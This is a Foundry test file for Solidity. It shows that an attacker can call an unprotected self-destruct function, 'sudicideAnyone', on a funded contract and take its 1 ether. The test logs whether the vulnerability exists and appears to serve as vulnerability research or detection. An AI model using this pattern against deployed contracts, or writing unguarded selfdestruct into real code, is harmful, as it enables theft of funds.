// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/simple_suicide.sol";

contract SimpleSuicideTest is Test {
    SimpleSuicide public contractInstance;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(owner);
        contractInstance = new SimpleSuicide();
        
        // Fund contract with 1 ether
        vm.deal(address(contractInstance), 1 ether);
    }

    function testAnyoneCanDestroyContract() public {
        console.log("--- BEFORE-Trigger ---");
        uint256 contractBalanceBefore = address(contractInstance).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Contract balance before: %s", contractBalanceBefore);
        console.log("Attacker balance before: %s", attackerBalanceBefore);

        console.log("--- Trigger sudicideAnyone ---");
        // Attacker calls sudicide function
        vm.prank(attacker);
        contractInstance.sudicideAnyone();

        console.log("--- AFTER-Trigger ---");
        uint256 contractBalanceAfter = address(contractInstance).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Contract balance after: %s", contractBalanceAfter);
        console.log("Attacker balance after: %s", attackerBalanceAfter);

        // Verify state changes
        assertEq(contractBalanceAfter, 0, "Contract balance should be 0 after selfdestruct");
        assertEq(attackerBalanceAfter, attackerBalanceBefore + 1 ether, "Attacker should receive 1 ether");

        // Differential validation
        bool contractBalanceChanged = contractBalanceBefore != contractBalanceAfter;
        bool attackerBalanceChanged = attackerBalanceAfter != attackerBalanceBefore;
        bool fundsStolen = attackerBalanceAfter - attackerBalanceBefore == contractBalanceBefore;
        
        if(contractBalanceChanged && attackerBalanceChanged && fundsStolen) {
            console.log("Vulnerability Exists: Attacker can destroy contract and steal funds");
        } else {
            console.log("Vulnerability not Exist: Attack didn't yield expected state changes");
        }
    }
}